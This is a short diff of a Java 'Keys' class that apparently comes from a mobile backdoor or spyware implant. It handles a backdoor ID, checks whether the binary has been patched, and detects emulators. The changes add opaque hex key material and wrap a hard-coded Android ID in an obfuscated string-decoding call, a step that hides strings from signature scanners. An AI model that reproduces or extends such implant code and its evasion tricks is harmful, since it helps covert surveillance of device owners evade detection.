@@ -86,6 +86,10 @@ public class Keys {
 
 	private static Object keysLock = new Object();
 
+	public String binarypatch = "11c083396e753002d43b28eb36b2147e14cb8e98e932db0078e224375aff72034243a176339e19e27957838098bb7b3a95e3d847aac52d15482e00d4";
+
+	//f5d9965e90d1151cb0cb41f103500356a68d261c4ba17d0fc27561f4cddead6afa5412efc465368599c446e9acffccaf15c43eacd51b5b739fd2666a488c4cbc9d79cb087b908bc1cfba93b8b0e6e845ea6e0dce247293d4ce4ae77236066aad31cc3bac3483bc6c51e89842cd90909380a133bb17639dac4f92ab9f2e3214ed
+
 	/**
 	 * Self.
 	 *
@@ -117,7 +121,7 @@ public class Keys {
 		}
 
 		//20.0=9774d56d682e549c M.d("9774d56d682e549c")
-		if ("9774d56d682e549c".equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
+		if (M.e("9774d56d682e549c").equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
 			// http://code.google.com/p/android/issues/detail?id=10603
 			// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
 			final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
@@ -246,6 +250,8 @@ public class Keys {
 	 * @return true, if successful
 	 */
 	public boolean hasBeenBinaryPatched() {
+
+		String binary = binarypatch.substring(0,16);
 		// EMp7Ca7-fpOBIr md5=b1688ffaaaafd7c1cab52e630b53178f		
 		byte[] bDigest = ByteArray.hexStringToByteArray(M.e("b1688ffaaaafd7c1cab52e630b53178f"));
 		byte[] calculated = Digest.MD5(backdoorId);
@@ -354,7 +360,7 @@ public class Keys {
 	public boolean enabled() {
 		if (Cfg.BLACKBERRY) {
 			return false;
-		}else{
+		} else {
 			return true;
 		}
 	}
